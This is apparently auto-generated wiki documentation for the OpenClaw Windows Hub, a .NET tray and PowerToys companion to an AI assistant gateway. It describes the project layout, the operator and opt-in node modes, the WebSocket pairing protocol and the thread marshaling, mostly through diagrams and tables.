# Page: Overview

# Overview

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [README.md](README.md)
- [build.ps1](build.ps1)
- [docs/VERSIONING.md](docs/VERSIONING.md)
- [src/OpenClaw.Shared/Models.cs](src/OpenClaw.Shared/Models.cs)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)
- [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj](src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj)
- [src/OpenClaw.Tray.WinUI/Package.appxmanifest](src/OpenClaw.Tray.WinUI/Package.appxmanifest)
- [src/OpenClaw.Tray/OpenClaw.Tray.csproj](src/OpenClaw.Tray/OpenClaw.Tray.csproj)

</details>



The OpenClaw Windows Hub is a Windows companion suite for [OpenClaw](https://openclaw.ai), an AI-powered personal assistant. It provides system tray integration, real-time monitoring, and remote control capabilities for Windows machines interacting with an OpenClaw Gateway instance.

This document provides a high-level introduction to the system architecture, project structure, and core concepts. For detailed information about specific subsystems, see:
- Application lifecycle and UI components: [Tray Application](#2)
- WebSocket communication with the gateway: [Gateway Communication](#3)
- Remote control capabilities: [Node Mode](#4)
- Settings and system integration: [Configuration & Settings](#5)
- Build and deployment: [Build & Distribution](#6)

## Purpose and Scope

The OpenClaw Windows Hub serves two primary functions:

1. **Operator Mode (Default)**: Monitor and interact with the OpenClaw Gateway running on the local machine or network. View active sessions, channel health, usage statistics, and receive notifications.

2. **Node Mode (Optional)**: Allow the OpenClaw agent to remotely control the Windows PC through capabilities like displaying UI, capturing screenshots, accessing the camera, and executing commands.

The hub communicates with an OpenClaw Gateway instance (typically running on macOS or WSL2) over WebSocket at `ws://localhost:18789`.

## System Architecture

The following diagram illustrates the overall system architecture and how components interact:

```mermaid
graph TB
    subgraph "Windows Machine"
        TrayWinUI["OpenClaw.Tray.WinUI<br/>(Modern WinUI)"]
        TrayWinForms["OpenClaw.Tray<br/>(Legacy WinForms)"]
        CommandPalette["OpenClaw.CommandPalette<br/>(PowerToys Extension)"]
        SharedLib["OpenClaw.Shared<br/>(Gateway Client Library)"]
        
        TrayWinUI --> SharedLib
        TrayWinForms --> SharedLib
        CommandPalette --> SharedLib
    end
    
    subgraph "OpenClaw.Shared Components"
        GatewayClient["OpenClawGatewayClient<br/>(WebSocket Protocol)"]
        NodeClient["WindowsNodeClient<br/>(Node Mode Protocol)"]
        Models["Data Models<br/>(SessionInfo, ChannelHealth, etc.)"]
        
        SharedLib --> GatewayClient
        SharedLib --> NodeClient
        SharedLib --> Models
    end
    
    subgraph "External Gateway"
        Gateway["OpenClaw Gateway<br/>(Mac/WSL2/Remote)"]
    end
    
    GatewayClient -->|"WebSocket ws://localhost:18789"| Gateway
    NodeClient -->|"WebSocket + Pairing"| Gateway
    
    subgraph "Windows System APIs"
        Registry["Windows Registry<br/>(Auto-start, URI scheme)"]
        Notifications["Windows Notifications<br/>(Toast messages)"]
        WebView2["WebView2 Runtime<br/>(Embedded browser)"]
        GlobalHotkey["Global Hotkey API<br/>(Ctrl+Alt+Shift+C)"]
        Camera["Windows.Media.Capture<br/>(Camera access)"]
    end
    
    TrayWinUI --> Registry
    TrayWinUI --> Notifications
    TrayWinUI --> WebView2
    TrayWinUI --> GlobalHotkey
    TrayWinUI --> Camera
    
    TrayWinForms --> Registry
    TrayWinForms --> Notifications
    TrayWinForms --> WebView2
```

**Sources:** [README.md:1-317](), [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:1-62](), [src/OpenClaw.Tray/OpenClaw.Tray.csproj:1-38](), [src/OpenClaw.Shared/OpenClaw.Shared.csproj:1-18]()

## Project Structure

The repository is organized as a .NET monorepo containing four projects:

| Project | Type | Target Framework | Purpose |
|---------|------|------------------|---------|
| `OpenClaw.Tray.WinUI` | WinUI 3 Application | net10.0-windows10.0.19041.0 | Modern Windows 11-style tray application with MSIX packaging support |
| `OpenClaw.Tray` | WinForms Application | net10.0-windows10.0.19041.0 | Legacy single-file EXE tray application for compatibility |
| `OpenClaw.Shared` | Class Library | net10.0 | Shared gateway client, node client, and data models |
| `OpenClaw.CommandPalette` | WinUI 3 Extension | net10.0-windows10.0.19041.0 | PowerToys Command Palette integration |

The following diagram maps the project structure to the physical file system:

```mermaid
graph TD
    Root["openclaw-windows-node/"]
    
    Root --> SrcDir["src/"]
    Root --> DocsDir["docs/"]
    Root --> BuildScript["build.ps1"]
    Root --> Solution["moltbot-windows-hub.sln"]
    
    SrcDir --> Shared["OpenClaw.Shared/"]
    SrcDir --> TrayWinUI["OpenClaw.Tray.WinUI/"]
    SrcDir --> Tray["OpenClaw.Tray/"]
    SrcDir --> CmdPalette["OpenClaw.CommandPalette/"]
    
    Shared --> SharedCsproj["OpenClaw.Shared.csproj"]
    Shared --> GatewayClientFile["OpenClawGatewayClient.cs"]
    Shared --> NodeClientFile["WindowsNodeClient.cs"]
    Shared --> ModelsFile["Models.cs"]
    
    TrayWinUI --> WinUICsproj["OpenClaw.Tray.WinUI.csproj"]
    TrayWinUI --> AppXaml["App.xaml.cs"]
    TrayWinUI --> MainWindow["MainWindow.xaml.cs"]
    TrayWinUI --> Manifest["Package.appxmanifest"]
    
    Tray --> TrayCsproj["OpenClaw.Tray.csproj"]
    Tray --> ProgramCs["Program.cs"]
    Tray --> TrayForm["TrayApplicationContext.cs"]
```

**Sources:** [README.md:280-292](), [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:1-62](), [src/OpenClaw.Tray/OpenClaw.Tray.csproj:1-38](), [src/OpenClaw.Shared/OpenClaw.Shared.csproj:1-18]()

## Operating Modes

The Windows Hub operates in two distinct modes, configurable through the Settings window:

```mermaid
graph LR
    subgraph "Operator Mode (Default)"
        OpMonitor["Monitor Gateway Status"]
        OpSessions["View Active Sessions"]
        OpChannels["View Channel Health"]
        OpUsage["View Token Usage"]
        OpNotifications["Receive Notifications"]
        OpControl["Start/Stop Channels"]
        OpQuickSend["Send Messages"]
        OpChat["Web Chat Window"]
    end
    
    subgraph "Node Mode (Optional)"
        NodePairing["Device Pairing<br/>(Ed25519 Auth)"]
        NodeCapabilities["Capability Registration"]
        NodeInvocation["Command Invocation"]
        
        NodeCapabilities --> SystemCap["SystemCapability<br/>(notify, run, which)"]
        NodeCapabilities --> CanvasCap["CanvasCapability<br/>(present, navigate, eval)"]
        NodeCapabilities --> ScreenCap["ScreenCapability<br/>(capture, list)"]
        NodeCapabilities --> CameraCap["CameraCapability<br/>(list, snap)"]
    end
    
    SettingsToggle["Settings Window:<br/>Enable Node Mode"]
    SettingsToggle -.->|"Enables"| NodePairing
```

**Operator Mode** is the default state. The application connects to the gateway as a client using `OpenClawGatewayClient`, subscribing to real-time events for sessions, channels, usage, and notifications. Users can view status, send messages, and control channels.

**Node Mode** is an opt-in feature that transforms the Windows PC into a remotely controllable agent. When enabled, `WindowsNodeClient` establishes a separate WebSocket connection with device pairing (Ed25519-based authentication) and registers capabilities that the OpenClaw agent can invoke.

**Sources:** [README.md:136-225](), [src/OpenClaw.Shared/Models.cs:11-17]()

## Core Technologies

The following table lists the primary technologies and their roles in the system:

| Technology | Version | Purpose | Used By |
|------------|---------|---------|---------|
| .NET | 10.0 | Primary runtime framework | All projects |
| WinUI 3 | Windows App SDK 1.8 | Modern Windows UI framework | OpenClaw.Tray.WinUI, OpenClaw.CommandPalette |
| WinForms | .NET 10 | Legacy Windows UI framework | OpenClaw.Tray |
| WebView2 | 1.0.3124.44+ | Embedded Chromium browser | Chat window, canvas capability |
| WebSocket (ClientWebSocket) | .NET Standard | Gateway communication protocol | OpenClawGatewayClient, WindowsNodeClient |
| NSec.Cryptography | 25.4.0 | Ed25519 key generation for node pairing | WindowsNodeClient |
| Microsoft.Toolkit.Uwp.Notifications | 7.1.3 | Windows toast notifications | All tray applications |
| Updatum | 1.3.4 | Auto-update system via GitHub Releases | OpenClaw.Tray, OpenClaw.Tray.WinUI |
| WinUIEx | 2.9.0 | WinUI helper utilities | OpenClaw.Tray.WinUI |

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:39-44](), [src/OpenClaw.Tray/OpenClaw.Tray.csproj:28-32](), [src/OpenClaw.Shared/OpenClaw.Shared.csproj:15-16]()

## Key Concepts and Data Models

The system uses strongly-typed data models defined in `OpenClaw.Shared` to represent gateway state:

```mermaid
graph TB
    subgraph "Connection State"
        ConnectionStatus["ConnectionStatus<br/>(enum)"]
        PairingStatus["PairingStatus<br/>(enum)"]
        
        ConnectionStatus --> Disconnected
        ConnectionStatus --> Connecting
        ConnectionStatus --> Connected
        ConnectionStatus --> Error
        
        PairingStatus --> Unknown
        PairingStatus --> Pending
        PairingStatus --> Paired
        PairingStatus --> Rejected
    end
    
    subgraph "Session Data"
        SessionInfo["SessionInfo"]
        AgentActivity["AgentActivity"]
        SessionPreviewInfo["SessionPreviewInfo"]
        
        SessionInfo --> Key["Key: string"]
        SessionInfo --> IsMain["IsMain: bool"]
        SessionInfo --> Status["Status: string"]
        SessionInfo --> Model["Model: string?"]
        SessionInfo --> Channel["Channel: string?"]
        
        AgentActivity --> ActivityKind["Kind: ActivityKind"]
        AgentActivity --> State["State: string"]
        AgentActivity --> ToolName["ToolName: string"]
    end
    
    subgraph "Channel & Usage"
        ChannelHealth["ChannelHealth"]
        GatewayUsageInfo["GatewayUsageInfo"]
        GatewayNodeInfo["GatewayNodeInfo"]
        
        ChannelHealth --> ChName["Name: string"]
        ChannelHealth --> ChStatus["Status: string"]
        ChannelHealth --> IsLinked["IsLinked: bool"]
        
        GatewayUsageInfo --> InputTokens["InputTokens: long"]
        GatewayUsageInfo --> OutputTokens["OutputTokens: long"]
        GatewayUsageInfo --> CostUsd["CostUsd: double"]
    end
    
    subgraph "Notifications"
        OpenClawNotification["OpenClawNotification"]
        
        OpenClawNotification --> Title["Title: string"]
        OpenClawNotification --> Message["Message: string"]
        OpenClawNotification --> Type["Type: string"]
        OpenClawNotification --> IsChat["IsChat: bool"]
    end
```

**Sources:** [src/OpenClaw.Shared/Models.cs:1-456]()

## Communication Protocol

Both operating modes communicate with the gateway using JSON-over-WebSocket messages:

**Operator Mode Protocol:**
- **Requests**: `sessions.list`, `usage.get`, `health.check`, `channel.start`, `channel.stop`
- **Events**: `event:agent` (activity updates), `event:chat` (notifications), `event:channels` (channel health)

**Node Mode Protocol:**
- **Registration**: Device pairing with Ed25519 public key
- **Requests**: `node.invoke.request` with `{ requestId, command, args }`
- **Responses**: `node.invoke.result` with `{ requestId, ok, payload/error }`

The following diagram illustrates the protocol message flow:

```mermaid
sequenceDiagram
    participant App as "Tray Application"
    participant GatewayClient as "OpenClawGatewayClient"
    participant NodeClient as "WindowsNodeClient"
    participant Gateway as "OpenClaw Gateway"
    
    Note over App,Gateway: Operator Mode Initialization
    
    App->>GatewayClient: ConnectAsync(gatewayUrl, token)
    GatewayClient->>Gateway: WebSocket Connect
    Gateway-->>GatewayClient: Connected
    
    GatewayClient->>Gateway: RequestSessionsAsync()
    Gateway-->>GatewayClient: sessions.list response
    GatewayClient->>App: SessionsUpdated event
    
    GatewayClient->>Gateway: RequestUsageAsync()
    Gateway-->>GatewayClient: usage response
    GatewayClient->>App: UsageUpdated event
    
    Note over App,Gateway: Real-time Events
    
    Gateway->>GatewayClient: event:agent
    GatewayClient->>App: ActivityChanged event
    
    Gateway->>GatewayClient: event:chat
    GatewayClient->>App: NotificationReceived event
    
    Note over App,Gateway: Node Mode Flow
    
    App->>NodeClient: ConnectAsync(gatewayUrl, token)
    NodeClient->>Gateway: WebSocket Connect + Registration
    Gateway-->>NodeClient: Pairing Status (pending)
    NodeClient->>App: PairingStatusChanged(Pending)
    
    Note over Gateway: User approves device
    
    Gateway-->>NodeClient: Pairing Status (paired)
    NodeClient->>App: PairingStatusChanged(Paired)
    
    Gateway->>NodeClient: node.invoke.request<br/>{requestId, command: "camera.snap", args}
    NodeClient->>NodeClient: Route to CameraCapability
    NodeClient->>App: Execute camera capture
    App-->>NodeClient: Image data
    NodeClient->>Gateway: node.invoke.result<br/>{requestId, ok: true, payload}
```

**Sources:** [src/OpenClaw.Shared/Models.cs:1-456](), [README.md:136-225]()

## Distribution and Packaging

The Windows Hub supports multiple distribution formats, each optimized for different deployment scenarios:

| Format | Architecture | Use Case | Features |
|--------|--------------|----------|----------|
| **Standalone EXE** | x64, ARM64 | Single-file portable deployment | Self-contained runtime, no installation |
| **MSIX Package** | x64, ARM64 | Microsoft Store-style deployment | Camera/mic consent prompts, auto-update |
| **ZIP Archive** | x64, ARM64 | Manual deployment, Updatum-compatible | Portable, update-friendly naming |
| **Inno Setup Installer** | x64, ARM64 | Traditional Windows installer | EXE + PowerToys extension bundled |

All builds use GitVersion for semantic versioning and Azure Trusted Signing for code signatures.

**Sources:** [README.md:263-292](), [docs/VERSIONING.md:1-79](), [build.ps1:1-242]()

## Configuration and Storage

Application state is stored in standard Windows user directories:

| Data Type | Location | Format | Purpose |
|-----------|----------|--------|---------|
| Settings | `%APPDATA%\OpenClawTray\settings.json` | JSON | Gateway URL, token, notification preferences, node mode settings |
| Logs | `%LOCALAPPDATA%\OpenClawTray\openclaw-tray.log` | Plain text | Application logs with 1MB rotation |
| Execution Policy | `%LOCALAPPDATA%\OpenClawTray\exec-policy.json` | JSON | Node mode command allowlist/denylist |
| Registry (Auto-start) | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | REG_SZ | Auto-start with Windows |
| Registry (URI scheme) | `HKCR\openclaw` | Registry keys | Deep link protocol handler |

**Sources:** [README.md:295-300]()

## Entry Points and User Interaction

Users can interact with the Windows Hub through multiple entry points:

```mermaid
graph TD
    User["User"]
    
    User --> SysTray["System Tray Icon<br/>(Left/right click)"]
    User --> DeepLink["Deep Links<br/>(openclaw://*)"]
    User --> GlobalHK["Global Hotkey<br/>(Ctrl+Alt+Shift+C)"]
    User --> PowerToys["PowerToys Command Palette"]
    User --> StartMenu["Start Menu / Auto-start"]
    
    SysTray --> TrayMenu["Tray Menu<br/>(Status, Sessions, Channels)"]
    SysTray --> WebChat["Web Chat Window<br/>(WebView2)"]
    
    DeepLink --> Settings["openclaw://settings"]
    DeepLink --> Chat["openclaw://chat"]
    DeepLink --> Dashboard["openclaw://dashboard"]
    DeepLink --> Send["openclaw://send?message=..."]
    
    GlobalHK --> QuickSend["Quick Send Dialog"]
    
    PowerToys --> PTDashboard["Open Dashboard"]
    PowerToys --> PTQuickSend["Quick Send"]
    PowerToys --> PTStatus["Full Status"]
```

**Sources:** [README.md:236-249](), [src/OpenClaw.Tray.WinUI/Package.appxmanifest:46-51]()

---

# Page: System Architecture

# System Architecture

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [README.md](README.md)
- [build.ps1](build.ps1)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)
- [src/OpenClaw.Shared/OpenClawGatewayClient.cs](src/OpenClaw.Shared/OpenClawGatewayClient.cs)
- [src/OpenClaw.Tray.WinUI/App.xaml.cs](src/OpenClaw.Tray.WinUI/App.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs)
- [src/OpenClaw.Tray/TrayApplication.cs](src/OpenClaw.Tray/TrayApplication.cs)
- [tests/OpenClaw.Shared.Tests/ModelsTests.cs](tests/OpenClaw.Shared.Tests/ModelsTests.cs)

</details>



This document describes the high-level architecture of the OpenClaw Windows Hub, explaining how the tray applications, shared library, gateway client, and node mode fit together. It covers the project structure, communication patterns, data flow, and thread synchronization mechanisms.

For detailed information about specific subsystems:
- For project descriptions and build artifacts, see [Projects & Components](#1.2)
- For WebSocket protocol details and gateway communication, see [Gateway Communication](#3)
- For node mode capabilities and command handling, see [Node Mode](#4)

---

## Architectural Overview

The OpenClaw Windows Hub is a multi-project monorepo that provides Windows companion applications for the OpenClaw AI assistant. The architecture follows a **layered pattern** with shared library code supporting multiple UI implementations.

```mermaid
graph TB
    subgraph "User Interface Layer"
        WinUI["OpenClaw.Tray.WinUI<br/>(Modern WinUI 3)"]
        WinForms["OpenClaw.Tray<br/>(Legacy WinForms)"]
        CommandPalette["OpenClaw.CommandPalette<br/>(PowerToys Extension)"]
    end
    
    subgraph "Shared Library Layer"
        Shared["OpenClaw.Shared"]
        GatewayClient["OpenClawGatewayClient"]
        NodeClient["WindowsNodeClient"]
        Models["Data Models<br/>(SessionInfo, ChannelHealth, etc.)"]
        Capabilities["Capabilities<br/>(System, Canvas, Screen, Camera)"]
    end
    
    subgraph "External Systems"
        Gateway["OpenClaw Gateway<br/>(WebSocket Server)<br/>ws://localhost:18789"]
        WebView2["WebView2 Runtime<br/>(Embedded Browser)"]
        Windows["Windows APIs<br/>(Registry, Notifications, etc.)"]
    end
    
    WinUI --> Shared
    WinForms --> Shared
    CommandPalette --> Shared
    
    Shared --> GatewayClient
    Shared --> NodeClient
    Shared --> Models
    Shared --> Capabilities
    
    GatewayClient -->|"WebSocket"| Gateway
    NodeClient -->|"WebSocket"| Gateway
    
    WinUI --> WebView2
    WinUI --> Windows
    WinForms --> WebView2
    WinForms --> Windows
```

**Sources:** [README.md:11-19](), [src/OpenClaw.Shared/OpenClaw.Shared.csproj:1-18]()

---

## Project Structure

The solution contains four distinct projects with clear separation of concerns:

| Project | Type | Framework | Purpose |
|---------|------|-----------|---------|
| **OpenClaw.Shared** | Class Library | .NET 10.0 | Core gateway client, data models, node capabilities |
| **OpenClaw.Tray.WinUI** | WinUI 3 App | .NET 10.0 (Windows 10.0.19041.0) | Modern tray application with native Windows 11 UI |
| **OpenClaw.Tray** | WinForms App | .NET 10.0 | Legacy tray application for compatibility |
| **OpenClaw.CommandPalette** | WinUI 3 Library | .NET 10.0 | PowerToys Command Palette extension |

**Sources:** [README.md:11-19](), [build.ps1:188-193]()

---

## Core Components and Responsibilities

### Application Entry Points

Both tray applications follow similar initialization patterns but with framework-specific implementations:

```mermaid
graph TB
    subgraph "WinUI Entry Point"
        AppXaml["App.xaml.cs"]
        OnLaunched["OnLaunched()"]
        Mutex["Single-instance check<br/>(Mutex: OpenClawTray)"]
        DeepLink["Protocol activation<br/>(openclaw://)"]
        UpdateCheck["Update check<br/>(UpdatumManager)"]
    end
    
    subgraph "WinForms Entry Point"
        Program["Program.cs"]
        Main["Main()"]
        MutexWF["Single-instance check<br/>(Mutex: OpenClawTray)"]
        DeepLinkWF["Command-line args<br/>(openclaw://)"]
        TrayApp["TrayApplication"]
    end
    
    AppXaml --> OnLaunched
    OnLaunched --> Mutex
    OnLaunched --> DeepLink
    OnLaunched --> UpdateCheck
    
    Program --> Main
    Main --> MutexWF
    Main --> DeepLinkWF
    Main --> TrayApp
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:209-300](), [src/OpenClaw.Tray/TrayApplication.cs:16-72]()

### Shared Library Architecture

The `OpenClaw.Shared` library contains all gateway communication logic, data models, and node capabilities. This enables code reuse across UI implementations.

```mermaid
graph TB
    subgraph "OpenClaw.Shared"
        Client["OpenClawGatewayClient<br/>(WebSocket client for operator mode)"]
        Node["WindowsNodeClient<br/>(WebSocket client for node mode)"]
        
        subgraph "Data Models"
            SessionInfo["SessionInfo"]
            ChannelHealth["ChannelHealth"]
            AgentActivity["AgentActivity"]
            GatewayUsageInfo["GatewayUsageInfo"]
            Notification["OpenClawNotification"]
        end
        
        subgraph "Capabilities"
            SystemCap["SystemCapability<br/>(notify, run, exec approvals)"]
            CanvasCap["CanvasCapability<br/>(present, navigate, eval, snapshot)"]
            ScreenCap["ScreenCapability<br/>(capture, list)"]
            CameraCap["CameraCapability<br/>(list, snap)"]
        end
        
        Helpers["Helpers<br/>(GatewayUrlHelper, Logger)"]
    end
    
    Client --> SessionInfo
    Client --> ChannelHealth
    Client --> AgentActivity
    Client --> GatewayUsageInfo
    Client --> Notification
    
    Node --> SystemCap
    Node --> CanvasCap
    Node --> ScreenCap
    Node --> CameraCap
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:12-67](), [README.md:269-276]()

---

## Communication Architecture

The application uses **WebSocket-based communication** with the OpenClaw Gateway. Two distinct clients handle different operational modes:

### Dual-Client Pattern

```mermaid
graph LR
    subgraph "Application"
        Settings["SettingsManager<br/>EnableNodeMode flag"]
        OperatorPath["Operator Mode Path"]
        NodePath["Node Mode Path"]
    end
    
    subgraph "Clients"
        GatewayClient["OpenClawGatewayClient<br/>(Operator role)"]
        NodeClient["WindowsNodeClient<br/>(Node role)"]
    end
    
    subgraph "Gateway"
        Gateway["OpenClaw Gateway<br/>ws://localhost:18789"]
    end
    
    Settings -->|"EnableNodeMode = false"| OperatorPath
    Settings -->|"EnableNodeMode = true"| NodePath
    
    OperatorPath --> GatewayClient
    NodePath --> NodeClient
    
    GatewayClient -->|"WebSocket<br/>(operator.admin scope)"| Gateway
    NodeClient -->|"WebSocket<br/>(node registration)"| Gateway
```

**Important:** Only one client is active at a time to avoid gateway conflicts. Node mode also receives health events, eliminating the need for the operator client.

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:263-274]()

### WebSocket Protocol Flow

The `OpenClawGatewayClient` implements a challenge-response authentication flow:

```mermaid
sequenceDiagram
    participant App as "Application"
    participant Client as "OpenClawGatewayClient"
    participant Gateway as "Gateway (ws://localhost:18789)"
    
    App->>Client: ConnectAsync()
    Client->>Gateway: WebSocket CONNECT
    Gateway-->>Client: event: connect.challenge (nonce)
    Client->>Gateway: req: connect (token, nonce, role)
    Gateway-->>Client: res: hello-ok (protocol 3)
    Client->>App: StatusChanged(Connected)
    
    Note over Client,Gateway: Request/Response Pattern
    
    Client->>Gateway: req: health (id: guid)
    Gateway-->>Client: res: payload.channels
    
    Client->>Gateway: req: sessions.list (id: guid)
    Gateway-->>Client: res: payload.sessions
    
    Note over Client,Gateway: Event Stream
    
    Gateway->>Client: event: agent (stream: job/tool)
    Client->>App: ActivityChanged(activity)
    
    Gateway->>Client: event: chat (notification)
    Client->>App: NotificationReceived(notification)
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:69-108](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:789-800]()

---

## Event-Driven Data Flow

The gateway client uses an **event-driven architecture** where all communication is asynchronous and callback-based.

### Event Types and Handlers

```mermaid
graph TB
    subgraph "OpenClawGatewayClient Events"
        StatusChanged["StatusChanged<br/>(ConnectionStatus)"]
        NotificationReceived["NotificationReceived<br/>(OpenClawNotification)"]
        ActivityChanged["ActivityChanged<br/>(AgentActivity)"]
        ChannelHealthUpdated["ChannelHealthUpdated<br/>(ChannelHealth[])"]
        SessionsUpdated["SessionsUpdated<br/>(SessionInfo[])"]
        UsageUpdated["UsageUpdated<br/>(GatewayUsageInfo)"]
        NodesUpdated["NodesUpdated<br/>(GatewayNodeInfo[])"]
    end
    
    subgraph "Application Event Handlers"
        OnStatusChanged["OnStatusChanged()<br/>→ Update tray icon"]
        OnNotificationReceived["OnNotificationReceived()<br/>→ Show toast"]
        OnActivityChanged["OnActivityChanged()<br/>→ Update menu"]
        OnChannelHealthUpdated["OnChannelHealthUpdated()<br/>→ Rebuild channel list"]
        OnSessionsUpdated["OnSessionsUpdated()<br/>→ Rebuild session list"]
        OnUsageUpdated["OnUsageUpdated()<br/>→ Update usage display"]
        OnNodesUpdated["OnNodesUpdated()<br/>→ Rebuild node list"]
    end
    
    StatusChanged --> OnStatusChanged
    NotificationReceived --> OnNotificationReceived
    ActivityChanged --> OnActivityChanged
    ChannelHealthUpdated --> OnChannelHealthUpdated
    SessionsUpdated --> OnSessionsUpdated
    UsageUpdated --> OnUsageUpdated
    NodesUpdated --> OnNodesUpdated
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:47-57](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:467-497]()

### Message Processing Pipeline

The `OpenClawGatewayClient` maintains a message processing loop that parses incoming WebSocket frames and dispatches them:

```mermaid
graph TB
    WSReceive["WebSocket.ReceiveAsync()"]
    Parse["JsonDocument.Parse()"]
    TypeCheck["Check message type"]
    
    Response["Handle response<br/>(res)"]
    Event["Handle event<br/>(event)"]
    
    MethodLookup["Lookup pending request method<br/>(_pendingRequestMethods)"]
    ResponseHandler["Known response handler"]
    EventHandler["Event dispatcher"]
    
    Sessions["ParseSessions()<br/>→ SessionsUpdated"]
    Channels["ParseChannelHealth()<br/>→ ChannelHealthUpdated"]
    Usage["ParseUsage()<br/>→ UsageUpdated"]
    Activity["HandleAgentEvent()<br/>→ ActivityChanged"]
    Notification["EmitNotification()<br/>→ NotificationReceived"]
    
    WSReceive --> Parse
    Parse --> TypeCheck
    TypeCheck -->|"type: res"| Response
    TypeCheck -->|"type: event"| Event
    
    Response --> MethodLookup
    MethodLookup --> ResponseHandler
    ResponseHandler --> Sessions
    ResponseHandler --> Channels
    ResponseHandler --> Usage
    
    Event --> EventHandler
    EventHandler -->|"event: agent"| Activity
    EventHandler -->|"event: chat"| Notification
    EventHandler -->|"event: health"| Channels
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:473-523](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:527-555]()

---

## Thread Marshaling and Synchronization

Both tray applications use **UI thread marshaling** to ensure gateway events are safely processed on the correct thread.

### WinUI Thread Model

```mermaid
graph TB
    subgraph "WebSocket Thread"
        WSThread["ClientWebSocket receive loop"]
        EventRaise["Event?.Invoke(this, data)"]
    end
    
    subgraph "Application Thread"
        DispatcherQueue["DispatcherQueue (UI thread)"]
        UIUpdate["Update tray icon, menu, windows"]
    end
    
    subgraph "Event Subscription (in App.xaml.cs)"
        OnStatusChanged["OnStatusChanged(sender, status)<br/>→ _dispatcherQueue?.Post()"]
        OnActivityChanged["OnActivityChanged(sender, activity)<br/>→ _dispatcherQueue?.Post()"]
        OnNotificationReceived["OnNotificationReceived(sender, notif)<br/>→ _dispatcherQueue?.Post()"]
    end
    
    WSThread --> EventRaise
    EventRaise --> OnStatusChanged
    EventRaise --> OnActivityChanged
    EventRaise --> OnNotificationReceived
    
    OnStatusChanged --> DispatcherQueue
    OnActivityChanged --> DispatcherQueue
    OnNotificationReceived --> DispatcherQueue
    
    DispatcherQueue --> UIUpdate
```

**Key Pattern:** The application stores a reference to `Microsoft.UI.Dispatching.DispatcherQueue` at startup and uses `Post()` to marshal all gateway callbacks to the UI thread.

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:212](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:467-497]()

### WinForms Thread Model

```mermaid
graph TB
    subgraph "WebSocket Thread"
        WSThread["ClientWebSocket receive loop"]
        EventRaise["Event?.Invoke(this, data)"]
    end
    
    subgraph "Application Thread"
        SyncContext["SynchronizationContext (UI thread)"]
        UIUpdate["Update tray icon, context menu"]
    end
    
    subgraph "Event Subscription (in TrayApplication.cs)"
        OnStatusChanged["OnStatusChanged(sender, status)<br/>→ _syncContext?.Post()"]
        OnActivityChanged["OnActivityChanged(sender, activity)<br/>→ _syncContext?.Post()"]
        OnNotificationReceived["OnNotificationReceived(sender, notif)<br/>→ _syncContext?.Post()"]
    end
    
    WSThread --> EventRaise
    EventRaise --> OnStatusChanged
    EventRaise --> OnActivityChanged
    EventRaise --> OnNotificationReceived
    
    OnStatusChanged --> SyncContext
    OnActivityChanged --> SyncContext
    OnNotificationReceived --> SyncContext
    
    SyncContext --> UIUpdate
```

**Key Pattern:** The application captures `SynchronizationContext.Current` (a `WindowsFormsSynchronizationContext`) during construction and uses `Post()` to marshal callbacks.

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:28](), [src/OpenClaw.Tray/TrayApplication.cs:60](), [src/OpenClaw.Tray/TrayApplication.cs:467-497]()

---

## Operation Modes: Operator vs Node

The application supports **two mutually exclusive operation modes**, controlled by the `EnableNodeMode` setting:

### Operator Mode (Default)

In operator mode, the application acts as a **monitoring and control interface** for the OpenClaw agent running on the gateway.

**Client Used:** `OpenClawGatewayClient`

**Capabilities:**
- View active sessions and channels
- Send chat messages
- View usage statistics
- Receive real-time activity notifications
- Control channels (start/stop)
- View cron jobs

**Role in Gateway Protocol:** `"operator"` with scopes: `["operator.admin", "operator.approvals", "operator.pairing"]`

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:341-372]()

### Node Mode (Experimental)

In node mode, the Windows PC becomes a **remotely controllable node** that the gateway agent can invoke commands on.

**Client Used:** `WindowsNodeClient`

**Capabilities:**
- **System:** Execute commands, show notifications, manage execution policies
- **Canvas:** Control WebView2 windows, navigate URLs, execute JavaScript
- **Screen:** Capture screenshots, list monitors
- **Camera:** List cameras, capture photos

**Role in Gateway Protocol:** `"node"` with device registration and pairing

**Pairing Flow:**
1. Application connects with device identity (Ed25519 keypair)
2. Gateway creates pairing request (status: `pending`)
3. User approves device via `openclaw devices approve <id>`
4. Application receives pairing confirmation
5. Gateway can now invoke node commands

**Sources:** [README.md:136-234](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:263-274]()

---

## State Management

The application maintains several categories of state:

### Cached Gateway State

Both `App.xaml.cs` and `TrayApplication.cs` cache the most recent data from the gateway to enable instant menu display without blocking on network requests:

| State Variable | Type | Updated By | Used In |
|----------------|------|------------|---------|
| `_currentStatus` | `ConnectionStatus` | `OnStatusChanged()` | Tray icon, status menu item |
| `_currentActivity` | `AgentActivity?` | `OnActivityChanged()` | Activity display, tray badge |
